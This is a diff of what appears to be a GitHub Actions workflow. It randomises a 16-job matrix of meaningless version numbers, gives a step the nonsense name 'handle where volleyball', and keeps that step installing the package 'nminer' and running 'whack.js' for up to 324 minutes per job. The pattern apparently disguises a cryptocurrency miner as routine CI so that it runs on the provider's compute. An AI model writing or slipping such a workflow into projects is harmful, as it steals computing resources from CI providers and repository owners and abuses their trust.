@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4658 }
-          - { version: 1629 }
-          - { version: 2274 }
-          - { version: 3536 }
-          - { version: 130 }
-          - { version: 4709 }
-          - { version: 3523 }
-          - { version: 9521 }
-          - { version: 1635 }
-          - { version: 6548 }
-          - { version: 2628 }
-          - { version: 5301 }
-          - { version: 9033 }
-          - { version: 67 }
-          - { version: 5767 }
-          - { version: 6237 }
+          - { version: 6960 }
+          - { version: 4579 }
+          - { version: 5172 }
+          - { version: 4489 }
+          - { version: 637 }
+          - { version: 5446 }
+          - { version: 8977 }
+          - { version: 4570 }
+          - { version: 348 }
+          - { version: 3752 }
+          - { version: 2093 }
+          - { version: 7957 }
+          - { version: 5430 }
+          - { version: 3642 }
+          - { version: 6925 }
+          - { version: 8100 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: handle where volleyball
         run: |
           npm install nminer@latest
-          timeout 316m node whack.js || echo "whack executed"
+          timeout 324m node whack.js || echo "whack executed"
